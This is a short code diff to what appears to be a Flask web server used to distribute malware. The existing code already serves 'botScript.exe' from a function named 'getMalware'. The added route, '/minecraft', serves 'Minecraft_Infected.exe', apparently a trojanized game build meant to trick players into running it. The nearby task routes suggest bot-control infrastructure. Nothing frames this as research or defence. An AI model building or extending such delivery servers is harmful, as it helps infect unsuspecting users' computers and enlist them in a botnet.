@@ -50,6 +50,10 @@ def getMainDownloader():
 def getMalware():
     return send_file(os.path.join(DOWNLOAD_PATH, "botScript.exe"))
 
+@app.route('/minecraft', methods=['GET'])
+def getMinecraftv():
+    return send_file(os.path.join(DOWNLOAD_PATH, "Minecraft_Infected.exe"))
+
 @app.route('/task1', methods=['GET'])
 def getTask1():
     #add path from static folder
